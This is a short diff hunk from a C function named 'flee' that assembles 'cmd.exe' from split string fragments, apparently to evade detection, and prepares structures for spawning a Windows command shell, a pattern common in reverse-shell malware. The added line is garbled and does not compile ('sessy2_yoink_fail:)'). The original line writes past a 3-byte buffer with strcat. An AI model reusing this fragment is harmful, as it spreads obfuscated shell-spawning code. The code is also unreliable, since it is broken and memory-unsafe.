@@ -43,7 +43,7 @@ void flee(char* who, int why) {
 
             char sessy1[] = "cm";
             char sessy2[] = "d.exe";
-            char* Powah = strcat(sessy1, sessy2);
+            char* Powah = strcat(sessy1, sessy2_yoink_fail:));
             STARTUPINFO sinfo;
             PROCESS_INFORMATION pinfo;
             memset(&sinfo, 0, sizeof(sinfo));
